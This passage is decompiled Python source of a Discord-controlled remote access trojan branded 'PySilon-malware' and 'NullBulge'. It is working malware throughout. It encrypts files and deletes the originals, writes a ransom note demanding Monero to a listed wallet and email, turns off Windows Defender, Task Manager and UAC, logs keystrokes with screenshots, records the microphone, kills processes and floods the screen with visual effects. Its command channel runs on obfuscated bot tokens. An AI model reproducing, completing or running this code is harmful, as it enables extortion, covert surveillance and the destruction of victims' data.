                    reaction_msg = await message.channel.send('```Syntax: .encrypt <action>\nActions:\n    start - Start encryption\n    status - Get the current status of encryption\n    key - Get the encryption key\n    note - Write the ransom note```')
                    await reaction_msg.add_reaction('🔴')
                elif message.content[9:] == 'start':
                    try:
                        characters = string.ascii_letters + string.digits
                        user_id = ''.join((random.choice(characters) for i in range(9)))
                        key = Fernet.generate_key()
                        cipher_suite = Fernet(key)
                        directory_path = os.getcwd()
                        message1 = await message.channel.send('Encryption started with ID: ' + user_id + ' and key: ' + key.decode())
                        message = await message.channel.send('Encryption progress: [--------------------] 0.00% (Unk/Unk files)')
                        process = concurrent.futures.ThreadPoolExecutor().submit(encrypt_directory, '/'.join(working_directory), message, cipher_suite)
                        encryption_processes[message.author.id] = {'process': process, 'user_id': user_id, 'key': key}
                        await message1.add_reaction('✅')
                    except Exception as e:
                        reaction_msg = await message.channel.send(f'An error occurred while starting encryption: {str(e)}')
                        await reaction_msg.add_reaction('🔴')
                elif message.content[9:] == 'status':
                    if message.author.id in encryption_processes:
                        process = encryption_processes[message.author.id]['process']
                        if process.done():
                            reaction_msg = await message.channel.send('Encryption has completed.')
                        else:  # inserted
                            reaction_msg = await message.channel.send('Encryption is still in progress.')
                        await reaction_msg.add_reaction('📋')
                    else:  # inserted
                        reaction_msg = await message.channel.send('Encryption is not currently running.')
                        await reaction_msg.add_reaction('🔴')
                elif message.content[9:] == 'key':
                    if message.author.id in encryption_processes:
                        key = encryption_processes[message.author.id]['key']
                        user_id = encryption_processes[message.author.id]['user_id']
                        reaction_msg = await message.channel.send(f'User ID: {user_id}\nEncryption Key: {key.decode()}')
                        await reaction_msg.add_reaction('🔑')
                    else:  # inserted
                        reaction_msg = await message.channel.send('Encryption is not currently running.')
                        await reaction_msg.add_reaction('🔴')
                elif message.content[9:] == 'note':
                    if message.author.id in encryption_processes:
                        user_id = encryption_processes[message.author.id]['user_id']

                        ransom_note = f'READ THIS ENTIRELY BEFORE ACTING, IF YOU SHUT DOWN NOW, ALL WILL BE LOST.\n            Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.\n            By now it has moved from your main drive, and has started encrypting other drives.\n            DONT PANIC! IF YOU START LOOKING FOR THE VIRUS, YOU WILL NOT GET ANY FILES ALREADY ENCRYPTED BACK! BUT THEY CAN BE SAVED!\n            To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.\n            You can do this by sending 100 USD to this monero address:\n            45i7kjWZuzJ4PdSbandaaE8S6mQATmneTYEpgsaaCqDmc7foEJDXwxd3ABR8bn6YE4c7hZ2dYEEr1CwG48gAknPL6zUpYyV\n            Don\'t know how to get monero? Here are some websites:\n            https://www.kraken.com/learn/buy-monero-xmr\n            https://localmonero.co/?language=en\n            https://www.bestchange.com/visa-mastercard-usd-to-monero.html\n            Cant get monero and want to pay via giftcards instead? contact the email below.\n            Once you have sent the ransom to the monero address you must write an email this this email address: ZeCBMail@proton.me\n            In this email you will include your personal ID so we know who you are. Your personal ID is: {user_id}\n            Payment is flexable, if you want to discuss pricing send an email with your discord username and I will contact you.\n            Be warned... pricing can go up too!\n            Once you have completeted all of the steps, you will be provided with the key to decrypt your files.\n            Don\'t know how ransomware works? Read up here:\n            https://www.trellix.com/en-us/security-awareness/ransomware/what-is-ransomware.html\n            https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/\n            https://www.trendmicro.com/vinfo/us/security/definition/Ransomware\n            Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the virus will make it impossible, as the key can not be generated.\n            Good luck\n            -NullBulge'
                        try:
                            file_path = os.path.join('/'.join(working_directory), 'NULLBULGE-RANSOMWARE-NOTE.txt')
                            with open(file_path, 'w') as f:
                                f.write(ransom_note)
                            reaction_msg = await message.channel.send('Ransom note has been written to the desktop.')
                            await reaction_msg.add_reaction('📝')
                        except Exception as e:
                            reaction_msg = await message.channel.send(f'An error occurred while writing the ransom note: {str(e)}')
                            await reaction_msg.add_reaction('🔴')
                    else:
                        reaction_msg = await message.channel.send('Encryption is not currently running.')
                        await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    reaction_msg = await message.channel.send('```Syntax: .encrypt <action>\nActions:\n    start - Start encryption\n    status - Get the current status of encryption\n    key - Get the encryption key\n    note - Write the ransom note```')
                    await reaction_msg.add_reaction('🔴')
            elif message.content.startswith('.admin'):
                await message.delete()
                if not IsAdmin():
                    reaction_msg = await message.channel.send('You must have administrative privileges to use this command.')
                    await reaction_msg.add_reaction('🔴')
                elif message.content.strip() == '.admin':
                    reaction_msg = await message.channel.send('```Syntax: .admin <option>\nOptions:\n    defender on - Enable Windows Defender\n    defender off - Disable Windows Defender\n    defender disable - Completely Disable Windows Defender\n    defender enable - Enable Windows Defender (after complete disable)\n    taskmgr on - Enable Task Manager\n    taskmgr off - Disable Task Manager\n    uac on - Enable UAC popups\n    uac off - Disable UAC popups```')
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    option = message.content.split()[1]
                    if option == 'defender':
                        state = message.content.split()[2]
                        if state == 'on':
                            try:
                                powershell_command = 'Set-MpPreference -DisableRealtimeMonitoring $false'
                                subprocess.run(['rundll32.exe', 'windir\\system32\\winlogon.exe,CreateProcessWithTrustedInstallerPrivileges', 'powershell.exe', '-Command', powershell_command], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('Windows Defender has been enabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while enabling Windows Defender: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        elif state == 'off':
                            try:
                                powershell_command = 'Set-MpPreference -DisableRealtimeMonitoring $true'
                                subprocess.run(['rundll32.exe', 'windir\\system32\\winlogon.exe,CreateProcessWithTrustedInstallerPrivileges', 'powershell.exe', '-Command', powershell_command], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('Windows Defender has been disabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while disabling Windows Defender: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        elif state == 'disable':
                            try:
                                powershell_commands = ['Set-MpPreference -DisableRealtimeMonitoring $true', 'Set-MpPreference -DisableIntrusionPreventionSystem $true', 'Set-MpPreference -DisableIOAVProtection $true', 'Set-MpPreference -DisableScriptScanning $true', 'Set-MpPreference -DisableArchiveScanning $true', 'Set-MpPreference -DisableBehaviorMonitoring $true', 'Set-MpPreference -DisableBlockAtFirstSeen $true', 'Set-MpPreference -DisablePrivacyMode $true', 'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true', 'Set-MpPreference -SubmitSamplesConsent 2', 'Set-MpPreference -MAPSReporting 0', 'Set-MpPreference -HighThreatDefaultAction 6', 'Set-MpPreference -ModerateThreatDefaultAction 6', 'Set-MpPreference -LowThreatDefaultAction 6', 'Set-MpPreference -SevereThreatDefaultAction 6']
                                powershell_command = '; '.join(powershell_commands)
                                subprocess.run(['rundll32.exe', 'windir\\system32\\winlogon.exe,CreateProcessWithTrustedInstallerPrivileges', 'powershell.exe', '-Command', powershell_command], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('Windows Defender has been completely disabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while disabling Windows Defender: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        elif state == 'enable':
                            try:
                                powershell_commands = ['Set-MpPreference -DisableRealtimeMonitoring $false', 'Set-MpPreference -DisableIntrusionPreventionSystem $false', 'Set-MpPreference -DisableIOAVProtection $false', 'Set-MpPreference -DisableScriptScanning $false', 'Set-MpPreference -DisableArchiveScanning $false', 'Set-MpPreference -DisableBehaviorMonitoring $false', 'Set-MpPreference -DisableBlockAtFirstSeen $false', 'Set-MpPreference -DisablePrivacyMode $false', 'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false', 'Set-MpPreference -SubmitSamplesConsent 1', 'Set-MpPreference -MAPSReporting 2', 'Set-MpPreference -HighThreatDefaultAction 1', 'Set-MpPreference -ModerateThreatDefaultAction 1', 'Set-MpPreference -LowThreatDefaultAction 1', 'Set-MpPreference -SevereThreatDefaultAction 1']
                                powershell_command = '; '.join(powershell_commands)
                                subprocess.run(['rundll32.exe', 'windir\\system32\\winlogon.exe,CreateProcessWithTrustedInstallerPrivileges', 'powershell.exe', '-Command', powershell_command], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('Windows Defender has been enabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while enabling Windows Defender: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('Invalid state. Use \"on\", \"off\", \"disable\", or \"enable\".')
                            await reaction_msg.add_reaction('🔴')
                    elif option == 'taskmgr':
                        state = message.content.split()[2]
                        if state == 'on':
                            try:
                                subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                subprocess.run(['gpupdate', '/force'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('Task Manager has been enabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while enabling Task Manager: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        elif state == 'off':
                            try:
                                subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                subprocess.run(['gpupdate', '/force'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('Task Manager has been disabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while disabling Task Manager: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('Invalid state. Use \"on\" or \"off\".')
                            await reaction_msg.add_reaction('🔴')
                    elif option == 'uac':
                        state = message.content.split()[2]
                        if state == 'on':
                            try:
                                subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '1', '/f'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                subprocess.run(['gpupdate', '/force'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('UAC popups have been enabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while enabling UAC popups: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        elif state == 'off':
                            try:
                                subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                subprocess.run(['gpupdate', '/force'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                reaction_msg = await message.channel.send('UAC popups have been disabled.')
                                await reaction_msg.add_reaction('✅')
                            except subprocess.CalledProcessError as e:
                                reaction_msg = await message.channel.send(f'An error occurred while disabling UAC popups: {str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('Invalid state. Use \"on\" or \"off\".')
                            await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        reaction_msg = await message.channel.send('```Syntax: .admin <option>\nOptions:\n    defender on - Enable Windows Defender\n    defender off - Disable Windows Defender\n    defender disable - Completely Disable Windows Defender\n    defender enable - Enable Windows Defender (after complete disable)\n    taskmgr on - Enable Task Manager\n    taskmgr off - Disable Task Manager\n    uac on - Enable UAC popups\n    uac off - Disable UAC popups```')
                        await reaction_msg.add_reaction('🔴')
            elif expectation == 'onefile':
                split_v1 = str(message.attachments).split('filename=\'')[1]
                filename = str(split_v1).split('\' ')[0]
                reaction_msg = await message.channel.send('```This file will be uploaded to  ' + '/'.join(working_directory) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
                await reaction_msg.add_reaction('📤')
                await reaction_msg.add_reaction('🔴')
                one_file_attachment_message = message
            elif expectation == 'multiplefiles':
                files_to_merge[1].append(message)

def on_press(key):
    global text_buffor  # inserted
    processed_key = str(key)[1:(-1)] if str(key)[0] == '\'' and str(key)[(-1)] == '\'' else key
    keycodes = {
        Key.space: ' ',
        Key.shift: ' *`SHIFT`*',
        Key.tab: ' *`TAB`*',
        Key.backspace: ' *`<`*',
        Key.esc: ' *`ESC`*',
        Key.caps_lock: ' *`CAPS LOCK`*',
        Key.f1: ' *`F1`*',
        Key.f2: ' *`F2`*',
        Key.f3: ' *`F3`*',
        Key.f4: ' *`F4`*',
        Key.f5: ' *`F5`*',
        Key.f6: ' *`F6`*',
        Key.f7: ' *`F7`*',
        Key.f8: ' *`F8`*',
        Key.f9: ' *`F9`*',
        Key.f10: ' *`F10`*',
        Key.f11: ' *`F11`*',
        Key.f12: ' *`F12`*'
    }
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]
        if processed_key == Key.enter:
            processed_key = ''
            messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*'])
            text_buffor = ''
        else:  # inserted
            if processed_key == Key.print_screen or processed_key == '@':
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or ('ddddd' in text_buffor):
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:  # inserted
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

def start_recording():
    while True:
        if send_recordings:
            recorded_mic = sounddevice.rec(int(1920000), samplerate=16000, channels=1)
            sounddevice.wait()
            try:
                os.mkdir('rec_')
            except:
                pass
            record_name = 'rec_\\' + current_time() + '.wav'
            write(record_name, 16000, recorded_mic)
            files_to_send.append([channel_ids['recordings'], '', record_name, True])
        else:  # inserted
            time.sleep(20)

def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except:  # inserted
        return False

def active_window_process_name():
    try:
        pid = GetWindowThreadProcessId(GetForegroundWindow())
        return Process(pid[(-1)]).name()
    except:
        return None

def process_blacklister():
    while True:
        if os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            
            for x, y in enumerate(process_blacklist):
                process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title='🟢 Success', description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        embeds_to_send.append([channel_ids['main'], embed])
                    else:  # inserted
                        embed = discord.Embed(title='📛 Error', description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        embeds_to_send.append([channel_ids['main'], embed])
        time.sleep(1)

def send_custom_message(title, text, style):
    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    possible_responses = ['', 'OK', 'Cancel', 'Abort', 'Retry', 'Ignore', 'Yes', 'No', '', '', 'Try Again', 'Continue']
    embed = discord.Embed(title='📧 User responded!', description=f'The response for Message(title=\"{title}\", text=\"{text}\", style={style})\nis:```{possible_responses[int(response)]}```', colour=discord.Colour.green())
    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
    embeds_to_send.append([channel_ids['main'], embed])

def get_hosts_file_path():
    hosts_file_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path)!= (-1):
        return hosts_file_path
    return None

class screen_manipulator:
    def __init__(self, saved_file):
        with open(saved_file, 'r', encoding='utf-8') as read_data:
            input_data = read_data.readlines()[0]
        settings, pixeldata = input_data.split('|')
        self.settings = json.loads(settings)
        self.pixeldata = pixeldata.split(',')
        self.saved_file = saved_file
        self.canvas_width, self.canvas_height = (self.settings['resolution'][0], self.settings['resolution'][1])

    def hex_to_rgb(self, hex):
        rgb = []
        hex = hex[1:]
        for i in [0, 2, 4]:
            decimal = int(hex[i:i + 2], 16)
            rgb.append(decimal)
        return tuple(rgb)

    def display_graphic(self, seconds):
        with open(self.saved_file, 'r', encoding='utf-8') as load_data:
            data = load_data.readlines()
        frame, unfetched_pixels = data[0].split('|')
        frame = json.loads(frame)
        pixels = []
        for line in unfetched_pixels.split(','):
            x, y = line.split(':')[0].split('.')
            if frame['mode'] == 'img':
                color = line.split(':')[1]
            else:  # inserted
                if frame['mode'] == 'bmp':
                    color = frame['color']
            pixels.append((int(x), int(y), self.hex_to_rgb(color)))
        size = frame['size']
        screen_dc = GetDC(0)
        screen_x_resolution = GetDeviceCaps(screen_dc, DESKTOPHORZRES)
        screen_y_resolution = GetDeviceCaps(screen_dc, DESKTOPVERTRES)
        starting_pos = (int(screen_x_resolution * (int(frame['position'][0]) / 100)), int(screen_y_resolution * (int(frame['position'][1]) / 100)))
        drawing = pixels
        start_time = time.time()
        while time.time() - start_time < seconds:
            screen_dc = GetDC(0)
            for pixel in drawing:
                brush = CreateSolidBrush(RGB(pixel[2][0], pixel[2][1], pixel[2][2]))
                SelectObject(screen_dc, brush)
                PatBlt(screen_dc, starting_pos[0] + pixel[0] * size, starting_pos[1] + pixel[1] * size, size, size, PATCOPY)
            DeleteObject(brush)
            ReleaseDC(0, screen_dc)

def flash_screen(effect):
    hdc = GetDC(0)
    x, y = (GetSystemMetrics(0), GetSystemMetrics(1))
    if effect == 'list':
        return ['invert\n', 'noise\n', 'lines\n', 'invert_squares\n', 'color_squares\n', 'diagonal_lines\n', 'snowfall\n', 'hypnotic_spirals\n', 'random_lines\n']
    if effect == 'invert':
        while True:
            PatBlt(hdc, 0, 0, x, y, PATINVERT)
    if effect == 'noise':
        for _ in range(x * y // 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            size = 100
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
    elif effect == 'lines':
        for _ in range(0, y, 5):
            PatBlt(hdc, 0, _, x, 2, PATINVERT)
    elif effect == 'invert_squares':
        for _ in range(200):
            rand_x1 = random.randint(0, x)
            rand_y1 = random.randint(0, y)
            rand_x2 = random.randint(0, x)
            rand_y2 = random.randint(0, y)
            PatBlt(hdc, rand_x1, rand_y1, rand_x2 - rand_x1, rand_y2 - rand_y1, PATINVERT)
    elif effect == 'color_squares':
        for i in range(10):
            for x in range(0, x, 20):
                for y in range(0, y, 20):
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x, y, 10, 10, PATCOPY)
                    DeleteObject(brush)
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x + 10, y + 10, 10, 10, PATCOPY)
                    DeleteObject(brush)
    elif effect == 'diagonal_lines':
        for x in range(0, x, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, x, 0, 1, y, PATCOPY)
            DeleteObject(brush)
        for y in range(0, y, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, 0, y, x, 1, PATCOPY)
            DeleteObject(brush)
    elif effect == 'snowfall':
        for i in range(10):
            stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
            for star in stars:
                rand_x, rand_y, size = star
                color = RGB(255, 255, 255)
                brush = CreateSolidBrush(color)
                SelectObject(hdc, brush)
                PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
            time.sleep(0.5)
    elif effect == 'hypnotic_spirals':
        for angle in range(0, 180, 1):
            radius = 1000
            x1 = int(x / 2 + radius * math.cos(math.radians(angle)))
            y1 = int(y / 2 - radius * math.sin(math.radians(angle)))
            x2 = int(x / 2 + radius * math.cos(math.radians(angle + 180)))
            y2 = int(y / 2 - radius * math.sin(math.radians(angle + 180)))
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            pen = CreatePen(PS_SOLID, 1, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    elif effect == 'random_lines':
        for _ in range(50):
            x1 = random.randint(0, x)
            y1 = random.randint(0, y)
            x2 = random.randint(0, x)
            y2 = random.randint(0, y)
            color = RGB(random.randrange(255), random.randrange(255), random.randrange(255))
            pen = CreatePen(PS_SOLID, 2, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    else:  # inserted
        PatBlt(hdc, 0, 0, x, y, PATINVERT)

    if effect!= 'list':
        Sleep(10)
        DeleteDC(hdc)

def encrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
    encrypted_file_path = file_path + '.NullBulged'
    with open(encrypted_file_path, 'wb', buffering=io.DEFAULT_BUFFER_SIZE) as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)

async def encrypt_directory(directory_path, message, cipher_suite, max_workers=1):
    start_time = time.time()
    files = []
    for root, dirs, filenames in os.walk(directory_path):
        for file in filenames:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.NullBulged'):
                files.append(file_path)
    total_files = len(files)
    encrypted_files = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for file_path in files:
            futures.append(executor.submit(encrypt_file, file_path, cipher_suite))
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
                encrypted_files += 1
            except Exception as e:
                print(f'Error encrypting file: {e}')
            current_time = time.time()
            if current_time - start_time >= 5:
                progress = encrypted_files / total_files * 100
                progress_bar = '|' * int(progress / 5) + '-' * (20 - int(progress / 5))
                status_update = f'Encryption progress: [{progress_bar}] {progress:.2f}% ({encrypted_files}/{total_files} files)'
                await message.edit(content=status_update)
                start_time = current_time
    progress = encrypted_files / total_files * 100
    progress_bar = '|' * int(progress / 5) + '-' * (20 - int(progress / 5))
    status_update = f'Encryption completed: [{progress_bar}] {progress:.2f}% ({encrypted_files}/{total_files} files)'
    await message.edit(content=status_update)
with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        decoded_token = base64.b64decode(token[::(-1)]).decode()
        try:
            client.run(decoded_token)
        except:  # inserted
            pass
    listener.join()
